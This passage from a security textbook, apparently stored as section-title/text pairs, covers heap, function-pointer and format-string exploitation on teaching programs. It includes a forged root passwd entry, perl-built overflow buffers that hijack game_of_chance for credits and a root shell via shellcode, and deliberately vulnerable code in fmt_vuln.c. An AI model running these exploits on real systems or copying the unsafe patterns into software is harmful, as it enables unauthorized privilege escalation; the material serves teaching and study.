=========\n/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]\n/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]\n./notetaker[0x8048916]\n/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]\n./notetaker[0x8048511]\n======= Memory map: ========\n08048000-08049000 r-xp 00000000 00:0f 44384 /cow/home/reader/booksrc/notetaker\n08049000-0804a000 rw-p 00000000 00:0f 44384 /cow/home/reader/booksrc/notetaker\n0804a000-0806b000 rw-p 0804a000 00:00 0 [heap]\nb7d00000-b7d21000 rw-p b7d00000 00:00 0\nb7d21000-b7e00000 ---p b7d21000 00:00 0\nb7e83000-b7e8e000 r-xp 00000000 07:00 15444 /rofs/lib/libgcc_s.so.1\nb7e8e000-b7e8f000 rw-p 0000a000 07:00 15444 /rofs/lib/libgcc_s.so.1\nb7e99000-b7e9a000 rw-p b7e99000 00:00 0\nb7e9a000-b7fd5000 r-xp 00000000 07:00 15795 /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd5000-b7fd6000 r--p 0013b000 07:00 15795 /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd6000-b7fd8000 rw-p 0013c000 07:00 15795 /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd8000-b7fdb000 rw-p b7fd8000 00:00 0\nb7fe4000-b7fe7000 rw-p b7fe4000 00:00 0\nb7fe7000-b8000000 r-xp 00000000 07:00 15421 /rofs/lib/ld-2.5.so\nb8000000-b8002000 rw-p 00019000 07:00 15421 /rofs/lib/ld-2.5.so\nbffeb000-c0000000 rw-p bffeb000 00:00 0 [stack]\nffffe000-fffff000 r-xp 00000000 00:00 0 [vdso]\nAborted\nreader@hacking:~/booksrc $ tail /etc/passwd\navahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false\ncupsys:x:106:113::/home/cupsys:/bin/false\nhaldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false\nhplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false\ngdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false\nmatrix:x:500:500:User Acct:/home/matrix:/bin/bash\njose:x:501:501:Jose Ronnick:/home/jose:/bin/bash\nreader:x:999:999:Hacker,,,:/home/reader:/bin/bash\n?\nmyroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/\nroot:/tmp/etc/passwd\nreader@hacking:~/booksrc $ su myroot\nPassword:\nroot@hacking:/home/reader/booksrc# whoami\nroot\nroot@hacking:/home/reader/booksrc#\nExploitation 155"
  },
  {
    "input": "0x342 Overflowing Function Pointers",
    "output": "0x342 Overflowing Function Pointers\nIf you have played with the game_of_chance.c program enough, you will realize\nthat, similar to at a casino, most of the games are statistically weighted in\nfavor of the house. This makes winning credits difficult, despite how lucky\nyou might be. Perhaps there’s a way to even the odds a bit. This program uses\na function pointer to remember the last game played. This pointer is stored\nin the user structure, which is declared as a global variable. This means all the\nmemory for the user structure is allocated in the bss segment.\nFrom game_of_chance.c\n// Custom user struct to store information about users\nstruct user {\nint uid;\nint credits;\nint highscore;\nchar name[100];\nint (*current_game) ();\n};\n...\n// Global variables\nstruct user player; // Player struct\nThe name buffer in the user structure is a likely place for an overflow.\nThis buffer is set by the input_name() function, shown below:\n// This function is used to input the player name, since\n// scanf(\"%s\", &whatever) will stop input at the first space.\nvoid input_name() {\nchar *name_ptr, input_char='\\n';\nwhile(input_char == '\\n') // Flush any leftover\nscanf(\"%c\", &input_char); // newline chars.\nname_ptr = (char *) &(player.name); // name_ptr = player name's address\nwhile(input_char != '\\n') { // Loop until newline.\n*name_ptr = input_char; // Put the input char into name field.\nscanf(\"%c\", &input_char); // Get the next char.\nname_ptr++; // Increment the name pointer.\n}\n*name_ptr = 0; // Terminate the string.\n}\nThis function only stops inputting at a newline character. There is nothing\nto limit it to the length of the destination name buffer, meaning an overflow\nis possible. In order to take advantage of the overflow, we need to make the\nprogram call the function pointer after it is overwritten. This happens in the\nplay_the_game() function, which is called when any game is selected from the\nmenu. The following code snippet is part of the menu selection code, used\nfor picking and playing a game.\n156 0x300\nif((choice < 1) || (choice > 7))\nprintf(\"\\n[!!] The number %d is an invalid selection.\\n\\n\", choice);\nelse if (choice < 4) { // Otherwise, choice was a game of some sort.\nif(choice != last_game) { // If the function ptr isn't set,\nif(choice == 1) // then point it at the selected game\nplayer.current_game = pick_a_number;\nelse if(choice == 2)\nplayer.current_game = dealer_no_match;\nelse\nplayer.current_game = find_the_ace;\nlast_game = choice; // and set last_game.\n}\nplay_the_game(); // Play the game.\n}\nIf last_game isn’t the same as the current choice, the function pointer of\ncurrent_game is changed to the appropriate game. This means that in order to\nget the program to call the function pointer without overwriting it, a game\nmust be played first to set the last_game variable.\nreader@hacking:~/booksrc $ ./game_of_chance\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 70 credits] -> 1\n[DEBUG] current_game pointer @ 0x08048fde\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n10 credits have been deducted from your account.\nPick a number between 1 and 20: 5\nThe winning number is 17\nSorry, you didn't win.\nYou now have 60 credits\nWould you like to play again? (y/n) n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\nExploitation 157\n7 - Quit\n[Name: Jon Erickson]\n[You have 60 credits] ->\n[1]+ Stopped ./game_of_chance\nreader@hacking:~/booksrc $\nYou can temporarily suspend the current process by pressing CTRL-Z. At\nthis point, the last_game variable has been set to 1, so the next time 1 is\nselected, the function pointer will simply be called without being changed.\nBack at the shell, we figure out an appropriate overflow buffer, which can\nbe copied and pasted in as a name later. Recompiling the source with\ndebugging symbols and using GDB to run the program with a breakpoint\nonmain() allows us to explore the memory. As the output below shows, the\nname buffer is 100 bytes from the current_game pointer within the user\nstructure.\nreader@hacking:~/booksrc $ gcc -g game_of_chance.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x8048813: file game_of_chance.c, line 41.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, main () at game_of_chance.c:41\n41 srand(time(0)); // Seed the randomizer with the current time.\n(gdb) p player\n$1 = {uid = 0, credits = 0, highscore = 0, name = '\\0' <repeats 99 times>,\ncurrent_game = 0}\n(gdb) x/x &player.name\n0x804b66c <player+12>: 0x00000000\n(gdb) x/x &player.current_game\n0x804b6d0 <player+112>: 0x00000000\n(gdb) p 0x804b6d0 - 0x804b66c\n$2 = 100\n(gdb) quit\nThe program is running. Exit anyway? (y or n) y\nreader@hacking:~/booksrc $\nUsing this information, we can generate a buffer to overflow the name\nvariable with. This can be copied and pasted into the interactive Game of\nChance program when it is resumed. To return to the suspended process,\njust type fg, which is short for foreground.\nreader@hacking:~/booksrc $ perl -e 'print \"A\"x100 . \"BBBB\" . \"\\n\"'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAABBBB\nreader@hacking:~/booksrc $ fg\n./game_of_chance\n5\nChange user name\n158 0x300\nEnter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\nYour name has been changed.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]\n[You have 60 credits] -> 1\n[DEBUG] current_game pointer @ 0x42424242\nSegmentation fault\nreader@hacking:~/booksrc $\nSelect menu option 5 to change the username, and paste in the overflow\nbuffer. This will overwrite the function pointer with 0x42424242. When menu\noption 1 is selected again, the program will crash when it tries to call the\nfunction pointer. This is proof that execution can be controlled; now all\nthat’s needed is a valid address to insert in place of BBBB.\nThe nm command lists symbols in object files. This can be used to find\naddresses of various functions in a program.\nreader@hacking:~/booksrc $ nm game_of_chance\n0804b508 d _DYNAMIC\n0804b5d4 d _GLOBAL_OFFSET_TABLE_\n080496c4 R _IO_stdin_used\nw _Jv_RegisterClasses\n0804b4f8 d __CTOR_END__\n0804b4f4 d __CTOR_LIST__\n0804b500 d __DTOR_END__\n0804b4fc d __DTOR_LIST__\n0804a4f0 r __FRAME_END__\n0804b504 d __JCR_END__\n0804b504 d __JCR_LIST__\n0804b630 A __bss_start\n0804b624 D __data_start\n08049670 t __do_global_ctors_aux\n08048610 t __do_global_dtors_aux\n0804b628 D __dso_handle\nw __gmon_start__\n08049669 T __i686.get_pc_thunk.bx\n0804b4f4 d __init_array_end\n0804b4f4 d __init_array_start\n080495f0 T __libc_csu_fini\n08049600 T __libc_csu_init\nU __libc_start_main@@GLIBC_2.0\nExploitation 159\n0804b630 A _edata\n0804b6d4 A _end\n080496a0 T _fini\n080496c0 R _fp_hw\n08048484 T _init\n080485c0 T _start\n080485e4 t call_gmon_start\nU close@@GLIBC_2.0\n0804b640 b completed.1\n0804b624 W data_start\n080490d1 T dealer_no_match\n080486fc T dump\n080486d1 T ec_malloc\nU exit@@GLIBC_2.0\n08048684 T fatal\n080492bf T find_the_ace\n08048650 t frame_dummy\n080489cc T get_player_data\nU getuid@@GLIBC_2.0\n08048d97 T input_name\n08048d70 T jackpot\n08048803 T main\nU malloc@@GLIBC_2.0\nU open@@GLIBC_2.0\n0804b62c d p.0\nU perror@@GLIBC_2.0\n08048fde T pick_a_number\n08048f23 T play_the_game\n0804b660 B player\n08048df8 T print_cards\nU printf@@GLIBC_2.0\nU rand@@GLIBC_2.0\nU read@@GLIBC_2.0\n08048aaf T register_new_player\nU scanf@@GLIBC_2.0\n08048c72 T show_highscore\nU srand@@GLIBC_2.0\nU strcpy@@GLIBC_2.0\nU strncat@@GLIBC_2.0\n08048e91 T take_wager\nU time@@GLIBC_2.0\n08048b72 T update_player_data\nU write@@GLIBC_2.0\nreader@hacking:~/booksrc $\nThe jackpot() function is a wonderful target for this exploit. Even though\nthe games give terrible odds, if the current_game function pointer is carefully\noverwritten with the address of the jackpot() function, you won’t even have to\nplay the game to win credits. Instead, the jackpot() function will just be called\ndirectly, doling out the reward of 100 credits and tipping the scales in the\nplayer’s direction.\nThis program takes its input from standard input. The menu selections\ncan be scripted in a single buffer that is piped to the program’s standard\n160 0x300\ninput. These selections will be made as if they were typed. The following\nexample will choose menu item 1, try to guess the number 7, select n when\nasked to play again, and finally select menu item 7 to quit.\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n7\\nn\\n7\\n\"' | ./game_of_chance\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 60 credits] ->\n[DEBUG] current_game pointer @ 0x08048fde\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 20\nSorry, you didn't win.\nYou now have 50 credits\nWould you like to play again? (y/n) -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 50 credits] ->\nThanks for playing! Bye.\nreader@hacking:~/booksrc $\nThis same technique can be used to script everything needed for the\nexploit. The following line will play the Pick a Number game once, then\nchange the username to 100 A’s followed by the address of the jackpot()\nfunction. This will overflow the current_game function pointer, so when\nthePick a Number game is played again, the jackpot() function is called\ndirectly.\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\nn\\n\" . \"7\\n\"'\n1\n5\nExploitation 161\nn\n5\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAp?\n1\nn\n7\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\nn\\n\" . \"7\\n\"' | ./game_of_chance\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 50 credits] ->\n[DEBUG] current_game pointer @ 0x08048fde\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 15\nSorry, you didn't win.\nYou now have 40 credits\nWould you like to play again? (y/n) -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 40 credits] ->\nChange user name\nEnter your new name: Your name has been changed.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 40 credits] ->\n162 0x300\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 140 credits\nWould you like to play again? (y/n) -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 140 credits] ->\nThanks for playing! Bye.\nreader@hacking:~/booksrc $\nAfter confirming that this method works, it can be expanded upon to\ngain any number of credits.\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\n\" . \"y\\n\"x10 . \"n\\n5\\nJon Erickson\\n7\\n\"' | ./\ngame_of_chance\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 140 credits] ->\n[DEBUG] current_game pointer @ 0x08048fde\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 1\nSorry, you didn't win.\nYou now have 130 credits\nWould you like to play again? (y/n) -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\nExploitation 163\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 130 credits] ->\nChange user name\nEnter your new name: Your name has been changed.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 130 credits] ->\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 230 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 330 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 430 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 530 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 630 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n164 0x300\nYou now have 730 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 830 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 930 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 1030 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 1130 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\nYou now have 1230 credits\nWould you like to play again? (y/n) -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 1230 credits] ->\nChange user name\nEnter your new name: Your name has been changed.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\nExploitation 165\n[Name: Jon Erickson]\n[You have 1230 credits] ->\nThanks for playing! Bye.\nreader@hacking:~/booksrc $\nAs you might have already noticed, this program also runs suid root.\nThis means shellcode can be used to do a lot more than win free credits. As\nwith the stack-based overflow, shellcode can be stashed in an environment\nvariable. After building a suitable exploit buffer, the buffer is piped to the\ngame_of_chance’s standard input. Notice the dash argument following the\nexploit buffer in the cat command. This tells the cat program to send standard\ninput after the exploit buffer, returning control of the input. Even though\nthe root shell doesn’t display its prompt, it is still accessible and still escalates\nprivileges.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat ./shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./game_of_chance\nSHELLCODE will be at 0xbffff9e0\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n7\\nn\\n5\\n\" . \"A\"x100 . \"\\xe0\\\nxf9\\xff\\xbf\\n\" . \"1\\n\"' > exploit_buffer\nreader@hacking:~/booksrc $ cat exploit_buffer - | ./game_of_chance\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 70 credits] ->\n[DEBUG] current_game pointer @ 0x08048fde\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 2\nSorry, you didn't win.\nYou now have 60 credits\nWould you like to play again? (y/n) -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n166 0x300"
  },
  {
    "input": "0x351 Format Parameters",
    "output": "7 - Quit\n[Name: Jon Erickson]\n[You have 60 credits] ->\nChange user name\nEnter your new name: Your name has been changed.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 60 credits] ->\n[DEBUG] current_game pointer @ 0xbffff9e0\nwhoami\nroot\nid\nuid=0(root) gid=999(reader)\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(\nplugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(re\nader)\n0x350 Format Strings\nA format string exploit is another technique you can use to gain control of\naprivileged program. Like buffer overflow exploits, format string exploits also\ndepend on programming mistakes that may not appear to have an obvious\nimpact on security. Luckily for programmers, once the technique is known,\nit’s fairly easy to spot format string vulnerabilities and eliminate them.\nAlthough format string vulnerabilities aren’t very common anymore, the\nfollowing techniques can also be used in other situations.\n0x351 Format Parameters\nYou should be fairly familiar with basic format strings by now. They have\nbeen used extensively with functions like printf() in previous programs.\nAfunction that uses format strings, such as printf(), simply evaluates the\nformat string passed to it and performs a special action each time a format\nparameter is encountered. Each format parameter expects an additional\nvariable to be passed, so if there are three format parameters in a format\nstring, there should be three more arguments to the function (in addition\ntothe format string argument).\nRecall the various format parameters explained in the previous chapter.\nExploitation 167\nParameter Input Type Output Type\n%d Value Decimal\n%u Value Unsigned decimal\n%x Value Hexadecimal\n%s Pointer String\n%n Pointer Number of bytes written so far\nThe previous chapter demonstrated the use of the more common\nformat parameters, but neglected the less common %n format parameter.\nThe fmt_uncommon.c code demonstrates its use.\nfmt_uncommon.c\n#include <stdio.h>\n#include <stdlib.h>\nint main() {\nint A = 5, B = 7, count_one, count_two;\n// Example of a %n format string\nprintf(\"The number of bytes written up to this point X%n is being stored in\ncount_one, and the number of bytes up to here X%n is being stored in\ncount_two.\\n\", &count_one, &count_two);\nprintf(\"count_one: %d\\n\", count_one);\nprintf(\"count_two: %d\\n\", count_two);\n// Stack example\nprintf(\"A is %d and is at %08x. B is %x.\\n\", A, &A, B);\nexit(0);\n}\nThis program uses two %n format parameters in its printf() statement.\nThe following is the output of the program’s compilation and execution.\nreader@hacking:~/booksrc $ gcc fmt_uncommon.c\nreader@hacking:~/booksrc $ ./a.out\nThe number of bytes written up to this point X is being stored in count_one, and the number of\nbytes up to here X is being stored in count_two.\ncount_one: 46\ncount_two: 113\nA is 5 and is at bffff7f4. B is 7.\nreader@hacking:~/booksrc $\nThe %n format parameter is unique in that it writes data without display-\ning anything, as opposed to reading and then displaying data. When a format\nfunction encounters a %n format parameter, it writes the number of bytes that\nhave been written by the function to the address in the corresponding func-\ntion argument. In fmt_uncommon, this is done in two places, and the unary\n168 0x300\naddress operator is used to write this data into the variables count_one and\ncount_two, respectively. The values are then outputted, revealing that 46 bytes\nare found before the first %n and 113 before the second.\nThe stack example at the end is a convenient segue into an explanation\nof the stack’s role with format strings:\nprintf(\"A is %d and is at %08x. B is %x.\\n\", A, &A, B);\nWhen this printf() function is called (as with any function), the argu-\nments are pushed to the stack in reverse order. First the value of B, then the\naddress of A, then the value of A, and finally the address of the format string.\nThe stack will look like the diagram here.\nThe format function iterates through the Top of the Stack\nformat string one character at a time. If the\ncharacter isn’t the beginning of a format Address of format string\nparameter (which is designated by the per-\nValue of A\ncent sign), the character is copied to the\noutput. If a format parameter is encountered, Address of A\nthe appropriate action is taken, using the\nValue of B\nargument in the stack corresponding to that\nparameter. Bottom of the Stack\nBut what if only two arguments are pushed\nto the stack with a format string that uses three\nformat parameters? Try removing the last argument from the printf()\nlinefor the stack example so it matches the line shown below.\nprintf(\"A is %d and is at %08x. B is %x.\\n\", A, &A);\nThis can be done in an editor or with a little bit of sed magic.\nreader@hacking:~/booksrc $ sed -e 's/, B)/)/' fmt_uncommon.c > fmt_uncommon2.c\nreader@hacking:~/booksrc $ diff fmt_uncommon.c fmt_uncommon2.c\n14c14\n< printf(\"A is %d and is at %08x. B is %x.\\n\", A, &A, B);\n---\n> printf(\"A is %d and is at %08x. B is %x.\\n\", A, &A);\nreader@hacking:~/booksrc $ gcc fmt_uncommon2.c\nreader@hacking:~/booksrc $ ./a.out\nThe number of bytes written up to this point X is being stored in count_one, and the number of\nbytes up to here X is being stored in count_two.\ncount_one: 46\ncount_two: 113\nA is 5 and is at bffffc24. B is b7fd6ff4.\nreader@hacking:~/booksrc $\nThe result is b7fd6ff4. What the hell is b7fd6ff4? It turns out that since\nthere wasn’t a value pushed to the stack, the format function just pulled data\nfrom where the third argument should have been (by adding to the current\nframe pointer). This means 0xb7fd6ff4 is the first value found below the\nstack frame for the format function.\nExploitation 169"
  },
  {
    "input": "0x352 The Format String Vulnerability",
    "output": "This is an interesting detail that should be remembered. It certainly\nwould be a lot more useful if there were a way to control either the number\nof arguments passed to or expected by a format function. Luckily, there is a\nfairly common programming mistake that allows for the latter.\n0x352 The Format String Vulnerability\nSometimes programmers use printf(string) instead of printf(\"%s\", string) to\nprint strings. Functionally, this works fine. The format function is passed the\naddress of the string, as opposed to the address of a format string, and it iterates\nthrough the string, printing each character. Examples of both methods are\nshown in fmt_vuln.c.\nfmt_vuln.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\nchar text[1024];\nstatic int test_val = -72;\nif(argc < 2) {\nprintf(\"Usage: %s <text to print>\\n\", argv[0]);\nexit(0);\n}\nstrcpy(text, argv[1]);\nprintf(\"The right way to print user-controlled input:\\n\");\nprintf(\"%s\", text);\nprintf(\"\\nThe wrong way to print user-controlled input:\\n\");\nprintf(text);\nprintf(\"\\n\");\n// Debug output\nprintf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &test_val, test_val,\ntest_val);\nexit(0);\n}\nThe following output shows the compilation and execution of fmt_vuln.c.\nreader@hacking:~/booksrc $ gcc -o fmt_vuln fmt_vuln.c\nreader@hacking:~/booksrc $ sudo chown root:root ./fmt_vuln\nreader@hacking:~/booksrc $ sudo chmod u+s ./fmt_vuln\nreader@hacking:~/booksrc $ ./fmt_vuln testing\nThe right way to print user-controlled input:\ntesting\n170 0x300\nThe wrong way to print user-controlled input:\ntesting\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\nBoth methods seem to work with the string testing. But what happens if\nthe string contains a format parameter? The format function should try to\nevaluate the format parameter and access the appropriate function argument\nby adding to the frame pointer. But as we saw earlier, if the appropriate\nfunction argument isn’t there, adding to the frame pointer will reference a\npiece of memory in a preceding stack frame.\nreader@hacking:~/booksrc $ ./fmt_vuln testing%x\nThe right way to print user-controlled input:\ntesting%x\nThe wrong way to print user-controlled input:\ntestingbffff3e0\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\nWhen the %x format parameter was used, the hexadecimal representa-\ntion of a four-byte word in the stack was printed. This process can be used\nrepeatedly to examine stack memory.\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"%08x.\"x40')\nThe right way to print user-controlled 